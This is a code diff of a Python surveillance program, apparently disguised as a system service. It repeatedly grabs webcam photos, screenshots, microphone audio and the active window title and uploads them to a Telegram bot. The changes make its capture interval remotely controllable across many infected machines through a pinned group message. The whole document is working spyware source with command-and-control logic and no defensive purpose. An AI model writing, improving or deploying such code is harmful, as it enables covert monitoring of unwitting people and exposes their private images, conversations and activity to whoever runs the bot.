@@ -8,6 +8,7 @@ from dotenv import load_dotenv
 from PIL import ImageGrab
 import numpy as np
 import tempfile
+import re
 
 # Platform specific imports
 try:
@@ -25,10 +26,9 @@ TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
 TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
 TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")
 
-INTERVAL = 60  # Default 60 seconds
+INTERVAL = 60  
 AUDIO_DURATION = 5  
 SAMPLE_RATE = 44100
-LAST_UPDATE_ID = 0
 
 def get_temp_path(filename):
     return os.path.join(tempfile.gettempdir(), filename)
@@ -43,29 +43,23 @@ def get_active_window():
     return "Non-Windows Environment"
 
 def update_remote_config():
-    global INTERVAL, LAST_UPDATE_ID
-    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
+    """Checks the PINNED message in the group to get the broadcasted interval."""
+    global INTERVAL
+    url = f"https://api.telegram.org/bot{TOKEN}/getChat"
     try:
-        params = {"offset": LAST_UPDATE_ID + 1, "timeout": 0}
-        resp = requests.get(url, params=params, timeout=5).json()
+        resp = requests.post(url, data={"chat_id": CHAT_ID}, timeout=10).json()
         if resp.get("ok"):
-            for update in resp.get("result", []):
-                LAST_UPDATE_ID = update["update_id"]
-                msg = update.get("message", {})
-                text = msg.get("text", "").strip().lower()
-                
-                if str(msg.get("chat", {}).get("id")) == str(CHAT_ID):
-                    if text.startswith("/set"):
-                        # Extract numbers from the message
-                        import re
-                        numbers = re.findall(r'\d+', text)
-                        if numbers:
-                            new_val = int(numbers[0])
-                            if 10 <= new_val <= 3600:
-                                INTERVAL = new_val
-                                send_text_message(f"✅ Interval updated to {INTERVAL}s")
-                        else:
-                            send_text_message("❌ Please provide a number (e.g., /set 60)")
+            pinned = resp.get("result", {}).get("pinned_message", {})
+            text = pinned.get("text", "").strip()
+            
+            # Extract digits from the pinned message
+            nums = re.findall(r'\d+', text)
+            if nums:
+                new_val = int(nums[0])
+                if 10 <= new_val <= 3600 and new_val != INTERVAL:
+                    INTERVAL = new_val
+                    # Optional: Notify that this specific machine updated
+                    # (Disabled by default to avoid spam from many machines)
     except Exception:
         pass
 
@@ -108,7 +102,7 @@ def capture_audio(filename):
 def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
     url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
     url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-    cap = f"Context: {window_title}"
+    cap = f"LOG: {window_title}"
     
     def post(u, tid, extra, fls):
         p = {"chat_id": CHAT_ID, "caption": extra}
@@ -124,17 +118,9 @@ def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
         with open(audio_file, "rb") as f: post(url_doc, TOPIC_AUDIO, f"LOG_A\n{cap}", {"document": f})
 
 def main():
-    global LAST_UPDATE_ID
     if not TOKEN or not CHAT_ID: return
 
-    # Clear update queue on start
-    try:
-        r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates").json()
-        if r.get("ok") and r.get("result"):
-            LAST_UPDATE_ID = r["result"][-1]["update_id"]
-    except: pass
-
-    send_text_message(f"🚀 Service Host Online. Interval: {INTERVAL}s")
+    send_text_message(f"🚀 SVC ONLINE. Broadcast listener active.")
 
     w_f = get_temp_path("idx_01.tmp")
     s_f = get_temp_path("idx_02.tmp")
@@ -142,7 +128,9 @@ def main():
 
     try:
         while True:
-            # Capture and Send
+            # Sync with the Pinned Message configuration
+            update_remote_config()
+
             ctx = get_active_window()
             capture_webcam(w_f)
             capture_screenshot(s_f)
@@ -154,11 +142,11 @@ def main():
                     try: os.remove(f)
                     except: pass
 
-            # High-frequency command check during wait
-            start_wait = time.time()
-            while time.time() - start_wait < INTERVAL:
+            # Wait for next cycle, checking for pin updates occasionally
+            wait_start = time.time()
+            while time.time() - wait_start < INTERVAL:
                 update_remote_config()
-                time.sleep(1)
+                time.sleep(10) # Check pinned message every 10s
             
     except KeyboardInterrupt:
         pass
